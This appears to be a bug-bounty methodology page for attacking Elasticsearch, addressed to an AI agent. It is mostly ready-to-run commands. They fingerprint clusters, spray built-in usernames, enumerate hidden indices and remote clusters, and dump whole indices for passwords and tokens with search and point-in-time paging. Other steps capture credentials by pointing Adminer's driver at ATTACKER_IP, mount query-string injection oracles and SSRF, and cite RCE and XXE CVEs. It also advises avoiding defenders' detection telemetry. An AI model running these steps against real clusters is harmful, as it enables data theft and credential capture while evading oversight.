---
technology: Elasticsearch
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded THIN (3 writeup files; see internal coverage ledger) + upstream-verified: NVD CVE-2014-3120, NVD CVE-2015-1427, Elastic security-free blog (6.8.0/7.1.0 Basic tier), Elastic _cat API reference, 2026-11-12. Wave 4 HT enrichment 2026-11-13: modern auto-security posture + _security/_authenticate + _has_privileges, hidden-index/alias/data-stream resolve family, aggregation profiling + PIT/search_after dumps, cross-cluster search (security models verified against Elastic remote-cluster docs), query-string injection through the app, and CVE-2025-54988/ESA-2025-14 ingest-attachment XXE (version gates verified against the Elastic advisory) — rewritten from HackTricks (src/network-services-pentesting/9200-pentesting-elasticsearch.md), CC BY-NC 4.0, accessed 2026-11-13."
provenance: "hybrid: corpus-grounded (4 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

Companion page: [[elasticsearch|Elasticsearch overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Elasticsearch Bug Bounty Methodology

**Scope:** Elasticsearch REST API on 9200/tcp (plain or self-signed HTTPS), standalone or as ELK storage; loopback instances reached via shell/port-forward; front-door apps (Adminer `elastic` driver) as credential sources. **Out of scope:** Apache Solr (different product — do not confuse `get_nodes()`-style APIs), OpenSearch (fork, similar page applies with its own advisory history — treat claims as unverified), Kibana's own surface ([[kibana]]).

**Authorization:** presumes written permission. `_search` on large indices is heavy — bound queries (`size`, `terminate_after`) and prefer `/_search?q=...` probes over full dumps on production. DESTRUCTIVE flags mark config/data-mutating steps.

## Decision tree (one screen)

1. `GET /` anonymous JSON → Phase 3 (unauth enum) → version fork (Phase 5).
2. `401 missing authentication credentials` → Phase 2 (credential hunt) → Phase 3 with auth.
3. Port unreachable, app on top → Phase 6 (indirect access: env files, driver capture).
4. Version `<1.2` or `<1.3.8/1.4.3` → Phase 5 scripting-era table before anything else.

## Phase 1 — Fingerprinting

```bash
nmap -p9200,9300,5601 -sV 198.51.100.10
curl -s http://198.51.100.10:9200/ | jq .version,.cluster_name
curl -sk https://127.0.0.1:9200/ -u 'user:DumpPassword$Here'   # loopback TLS pattern (observed)
```

Read: `version.number` and `cluster_name` from `/` (one observed chain identified ES from the browser JSON). 5601 open = Kibana in the stack → [[kibana]]. 9300 is node transport, not REST — its presence corroborates a multi-node cluster. An HTTP proxy answering on 9200 (elastic-branded 401 JSON) still leaks version via the error body on most builds.

Expected output shape: `{"name":"NODE","cluster_name":"elasticsearch","version":{"number":"8.x.y",...}}`.

## Phase 2 — Auth fork

- **No auth** → Phase 3 immediately.
- **Auth on**: base64 `Authorization: Basic ...` over HTTPS is the Basic-tier default (user `elastic` is the superuser). Credential sources, in field-observed order:
  1. `.env`/config on an adjacent foothold: `ELASTICURI=https://127.0.0.1:9200` (observed) plus API keys in app configs.
  2. Captured auth flow: Adminer's `elastic` driver with `auth[driver]=elastic&auth[server]=ATTACKER_IP` — the application logs into *your* listener, handing over username/password (field-observed; upstream: Adminer SSRF CVE-2021-21311 context).
  3. Default/weak `elastic:changeme`-style pairs on self-hosted stacks (validate, don't assume).
- Kibana service-account or dashboard creds often double as ES creds — same realm.

**Modern default posture (don't assume a walk-in).** Current self-managed releases run automatic security setup on first start: TLS on both HTTP and transport layers, a generated password for the `elastic` superuser, and a short-lived Kibana enrollment token. Probe both schemes and read the status line, `WWW-Authenticate`, and `X-Elastic-Product` headers before concluding anything (`curl -skD- -o /dev/null https://198.51.100.10:9200/`). A `401` means no acceptable credential was supplied; a `403` means an authenticated (possibly anonymous) principal lacks the privilege — keep probing lower-privileged endpoints in the second case. With ANY valid credential, the first request is `/_security/_authenticate` (returns the effective username, roles, realm, API-key metadata), and `/_security/user/_has_privileges` is the non-destructive permission oracle — request each privilege you care about and read the per-privilege booleans back:

```bash
curl -sk -u 'user:***' -H 'Content-Type: application/json' \
  https://198.51.100.10:9200/_security/user/_has_privileges -d '{
  "cluster": ["monitor", "manage", "manage_security"],
  "index": [{"names": ["*"], "privileges": ["read", "write", "delete_index"]}]}'
```

`GET /_security/user` and `/_security/role` map the whole estate but need admin security privileges; `_has_privileges` works for anyone. Built-in usernames worth spraying where authorized: `elastic` (superuser), `kibana_system`, `logstash_system`, `beats_system`, `apm_system`, `remote_monitoring_user` — modern installs generate per-service passwords, very old ones shared `changeme`.

## Phase 3 — Enumeration (the REST sweep)

```bash
curl -s 'http://198.51.100.10:9200/_cat/indices?v'          # databases + doc counts
curl -s 'http://198.51.100.10:9200/_cluster/health?pretty'  # status + version recheck
curl -s 'http://198.51.100.10:9200/_cat/nodes?v'            # node list
curl -s 'http://198.51.100.10:9200/_cat/master?v'
curl -s 'http://198.51.100.10:9200/_nodes?pretty'           # plugins, versions per node
```

Upstream: `/_cat` alone lists every cat command; `?v` adds headers, `?help` documents fields. The `.kibana` index implies dashboards (and often saved-object credentials).

**Hidden targets: `_cat/indices` is not the whole estate.** Wildcard expansion hides hidden indices, and applications often read aliases and data streams rather than concrete indices. The resolve family with `expand_wildcards=all` surfaces everything `_cat` omits:

```bash
ES=https://198.51.100.10:9200
curl -sk -u 'user:***' "$ES/_resolve/index/*?expand_wildcards=all&pretty"   # indices + aliases + data streams
curl -sk -u 'user:***' "$ES/_data_stream/*?expand_wildcards=all&pretty"
curl -sk -u 'user:***' "$ES/*/_mapping?expand_wildcards=all&pretty"        # every field name, no documents read
curl -sk -u 'user:***' "$ES/*/_field_caps?fields=*&expand_wildcards=all&pretty"
```

Then enumerate the objects that disclose data FLOW (and second clusters): `/_ingest/pipeline`, `/_index_template`, `/_component_template`, `/_snapshot` (snapshot repositories — where backups with old secrets live), `/_remote/info`. Success and 403 responses both map the credential's cluster privileges.

## Phase 4 — Data exfil via `_search`

```bash
curl -s 'http://198.51.100.10:9200/quotes/_search?size=100' | jq
curl -s 'http://198.51.100.10:9200/user-00001/_search?q=password:*&size=50' | jq
curl -s -H 'Content-Type: application/json' 'http://198.51.100.10:9200/_search' \
  -d '{"query":{"multi_match":{"query":"password","fields":["*"]}},"size":100}'
```

Observed patterns worth copying: one chain reads every document of an index and finds base64-encoded SSH credentials; another reads a `seed` document plus a `user-00001` index to rebuild a password offline. Prioritize index/doc field names: `password`, `seed`, `token`, `apikey`, `session`, `backup`. Wildcard `_search` across indices is expensive on big clusters — bound it (`size`, `_source` filtering, `terminate_after`).

**Profile fields without pulling documents.** Where a read exists but you want the shape first: `size: 0` plus `terms` aggregations returns bucket counts per value with zero document hits (check `_mapping` first — `text` fields aggregate via their `.keyword` subfield). `sum_other_doc_count` says how many buckets were omitted — the leakage is in the bucket KEYS, so even an aggregation-only query can disclose sensitive values. And a complete dump needs pagination discipline: the default `size` cap is 10 hits, `index.max_result_window` (10,000) bounds a single request, so use a point-in-time plus `search_after` for a consistent full walk (track_total_hits for exact counts; close the PIT when done):

```bash
PIT=$(curl -sk -u 'user:***' -XPOST "$ES/<index>/_pit?keep_alive=2m" | jq -r .id)
curl -sk -u 'user:***' -XPOST "$ES/_search" -H 'Content-Type: application/json' -d \
  '{"size":1000,"track_total_hits":true,"query":{"match_all":{}},"pit":{"id":"'$PIT'","keep_alive":"2m"},"sort":[{"_shard_doc":"asc"}]}'
# repeat with "search_after": [<last hit's sort values>], always reusing the newest pit_id
curl -sk -u 'user:***' -XDELETE "$ES/_pit" -H 'Content-Type: application/json' -d '{"id":"'$PIT'"}'
```

**Cross-cluster search — data beyond the local `_cat/indices`.** `GET /_remote/info` lists configured remote clusters; address their indices as `REMOTE_ALIAS:INDEX_PATTERN` (`$ES/REMOTE_ALIAS:*/_search`, `.../REMOTE_ALIAS:*/_field_caps`). A 403 on `_remote/info` does NOT rule cross-cluster out — configuration inspection and remote-index reads are separate privileges, so test any alias learned from app config or errors, and read the `_clusters` object in each response: an HTTP 200 can still contain skipped or partially failed remotes. Authorization depends on the model (upstream-verified): with the current API-key model the remote cross-cluster API key caps what anyone — even a local superuser — can reach; with the deprecated TLS-certificate model role NAMES are forwarded to the remote, and a superuser on the local cluster receives full read access on the remote cluster. Older estates on the certificate model make "ES credential" mean "two clusters of data".

## Phase 5 — Version-gated RCE era table (upstream-verified)

| Banner | Bug class | Mechanism |
|---|---|---|
| `< 1.2` | **CVE-2014-3120** — default-on dynamic scripting | Arbitrary MVEL/Java via the API `source` parameter to `_search` (NVD: "remote attackers ... execute arbitrary MVEL expressions and Java code via the source parameter to _search"); in NVD KEV catalog |
| `1.3.x < 1.3.8`, `1.4.x < 1.4.3` | **CVE-2015-1427** — Groovy sandbox bypass | Crafted script escapes the sandbox to shell commands (NVD); also NVD KEV |
| `>= 6.8 / 7.1` (2019) | Security (TLS/RBAC/realm) **available** at Basic tier | Not a vuln — a hardening opportunity the estate may have skipped (upstream Elastic blog) |

Exploitation of the scripting-era bugs is a **DESTRUCTIVE** memory-corruption-class action on shared clusters: use published PoCs, expect crashes, and prefer the data plane (Phases 3-4) unless RCE is the authorized objective. Post-2015, scripting is sandboxed and disabled by default for inline use — treat any modern "script RCE" claim as unverified until matched to a current advisory.

**5b. The ingest-pipeline parser surface — CVE-2025-54988 (ESA-2025-14).** An indexing permission can become a server-side parser entry point: pipelines with an `attachment` processor base64-decode document bytes and hand PDFs/Office files to Apache Tika ON THE INGEST NODE. The verified bug: crafted XFA content inside a PDF triggers an XXE in Tika's PDF parser — authenticated attacker, internal/third-party requests or sensitive-file reads (upstream-verified against the Elastic advisory: affected 8.18.0–8.18.5, 8.19.0–8.19.2, 9.0.0–9.0.5, 9.1.0–9.1.2; fixed 8.18.6/8.19.3/9.0.6/9.1.3; versions still on the Java Security Manager — 8.17.8 and below — were mitigated). Both gates matter: the pipeline must exist AND the version must be affected. Enumerate with `GET /_ingest/pipeline` (note each attachment processor's input field), prove reachability harmlessly with `POST /_ingest/pipeline/<id>/_simulate` (no document persisted) before sending crafted files into a real index.

## Phase 6 — Indirect access (port never faced you)

- **Port-forward then curl**: with any shell on the host, `ssh -L 9200:127.0.0.1:9200` (or chisel) plus the `.env` credential reaches the loopback instance (field-observed).
- **Front-door driver abuse**: Adminer with the elastic driver parameterized to ATTACKER_IP captures the application's ES credentials (field-observed).
- **SSRF from the web tier**: 9200 accepts GET with no handshake — any URL-fetch primitive speaks enough ES for Phase 3/4 (`_cat` returns text, `_search` returns JSON; gopher not required).

**6b. Query-string injection through the application (indirect ES, second flavor).** A search box or `/api/search?q=` that forwards user text into a `query_string` query (or the `q=` URL parameter — same syntax) lets the USER write the query. The syntax gives you field selection the UI never intended:

- `owner:admin`, `private:true`, `_exists_:password` — address fields the frontend never shows; field names take wildcards (`book.*:(quick OR brown)`).
- `x OR private:true` — broaden a restriction the backend concatenated into one expression (an independent Query DSL `filter` clause still applies — only the string expression is yours).
- `secret_token:a*`, `secret_token:b*`, ... — compare result counts per prefix and a hidden field becomes a blind extraction oracle.
- Leading wildcards (`*ing`) and `/regex/` force whole-index term scans — heavy CPU when allowed; a cheap DoS observation for the report.

Test sequence for "is this input parsed as query syntax": (1) send reserved characters alone (`)`, `"`, `\`, `/` — an error a plain word does not trigger means parsing happened); (2) compare `field:a*` vs `field:zzzqqq*` and `*` vs a random word — different counts mean field queries work; (3) walk likely hidden fields (`password`, `token`, `email`, `owner`, `tenant`, `private`, `deleted`) with `_exists_:` and prefixes. The same bug class against other datastores is the NoSQL/SQL injection family; against Elasticsearch the payload vocabulary is Lucene's query-string grammar.

## Phase 7 — Defense and validation notes

- **Unauth finding:** `GET /` output + one sensitive `_search` hit = version + data class in a two-screenshot report.
- **Credentiated finding:** show the source of the credential (env file line, captured auth request) — the leak is the report; ES merely confirms impact.
- **Detection telemetry defenders should have (note and avoid):** anonymous `GET /` and `_cat/*` bursts, `_search` with `size` maxed, Adminer-style `elastic` driver logins from wrong IPs, TLS-but-no-auth clusters.
- **Hardening for the report:** enable x-pack security (Basic-tier free since 6.8/7.1) — TLS, realms, RBAC; bind 9200 to an internal interface; snapshot-repo paths locked down; patch or isolate pre-1.4.3 clusters immediately (KEV-listed bugs).

## Appendix A — Tooling (named in prose)

- **curl** — the entire attack surface speaks plain HTTP(S); `-s`, `-k` for self-signed loopback TLS, `-u` for Basic auth.
- **jq** — reshape `_search`/`_nodes` JSON; every observed chain pipes curl into it.
- **nmap** — 9200/9300/5601 service detection frames the stack.
- **Adminer** — the elastic driver is both a finding (exposed admin tool) and a credential-capture instrument.
- **elasticsearch-py clients** — application-side presence of the client library marks ES in the stack even when the port is filtered.
- References: Elastic `_cat` API reference and security docs; NVD records for the two CVEs above (upstream-verified for this page).

## Appendix B — Quick reference

```bash
# fingerprint + era
curl -s http://198.51.100.10:9200/ | jq .version.number,.cluster_name
# databases
curl -s 'http://198.51.100.10:9200/_cat/indices?v'
# health/version recheck
curl -s 'http://198.51.100.10:9200/_cluster/health?pretty' | jq .status,.number
# exfil
curl -s 'http://198.51.100.10:9200/<index>/_search?size=100' | jq
# loopback + creds (observed pattern)
curl -sk https://127.0.0.1:9200/_cat/indices -u 'user:DumpPassword$Here'
```
